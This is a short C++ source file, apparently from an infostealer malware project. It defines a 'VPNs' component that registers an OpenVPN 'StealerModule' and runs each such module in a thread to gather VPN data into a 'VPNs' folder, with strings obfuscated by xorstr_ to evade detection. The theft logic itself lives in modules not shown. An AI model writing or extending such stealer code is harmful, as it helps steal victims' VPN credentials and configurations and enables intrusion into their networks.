//
// Created by .1qxz on 08.06.2024.
//

#include "VPNs.h"
#include "impl/OpenVPN.h"

VPNs::VPNs()
{
    this->modules.push_back(new OpenVPN());
}

void VPNs::execute(fs::path &root) {
    fs::path vpns_path = root / xorstr_("VPNs");
    std::vector<std::thread> threads;

    for(StealerModule* module : this->modules) {
        threads.emplace_back([module, &vpns_path]() {
            module->execute(vpns_path);
        });
    }

    for(auto& thread : threads) {
        if (thread.joinable()) {
            thread.join();
        }
    }
}